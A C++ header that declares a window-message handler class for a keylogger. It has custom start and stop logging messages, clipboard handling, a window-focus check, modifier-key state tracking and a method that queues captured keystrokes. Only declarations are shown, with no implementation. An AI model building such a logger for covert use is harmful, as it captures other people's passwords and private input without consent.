#pragma once
#include "pch.h"
#include "SharedQueue.h"

#define WM_STARTLOG 0x401
#define WM_STOPLOG 0x402
#define WM_DEBUG 0x403
extern "C" {
	extern HINSTANCE hInst;
}
class WinMsgHandler
{
public:
	WinMsgHandler(std::shared_ptr<SharedQueue> queue);
	~WinMsgHandler();
	HWND wHandle{ nullptr };
	
protected:
	static LRESULT CALLBACK baseHandle(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
	LRESULT classHandleMsg(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
	LRESULT HandleClipboard();


private:
	void checkFocus(UINT keychar);
	void pushKey(USHORT keyChar, USHORT vkey);
	bool isShifted{ false };
	bool isCtrled{ false };
	bool isAlted{ false };
	bool caplock{ false }; // initalized when keylogger is started
	HWND hPrevWind{ nullptr };
	std::shared_ptr<SharedQueue> _queue;
	HKL locale{ nullptr };


};

